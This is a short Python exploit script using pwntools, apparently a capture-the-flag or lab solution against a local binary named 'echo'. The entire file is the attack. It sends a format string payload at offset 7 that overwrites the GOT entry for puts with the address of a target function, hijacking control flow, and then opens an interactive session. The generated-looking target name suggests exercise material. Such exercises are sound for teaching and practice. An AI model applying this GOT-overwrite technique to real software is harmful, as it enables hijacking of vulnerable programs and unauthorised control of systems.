from pwn import *
context.arch = 'i386'
context.log_level = 'debug' 
sh = process("./echo", env={"LD_LIBRARY_PATH":"."})

sh.recvuntil("You can exactly 256 charecters ...\n") 
elf=ELF('./echo')
puts_got=elf.got['puts']
target_addr = elf.plt["target_function_3180105507"]
payload = fmtstr_payload(7,{puts_got:target_addr})
sh.sendline(payload)
print(sh.recv())

sh.interactive()

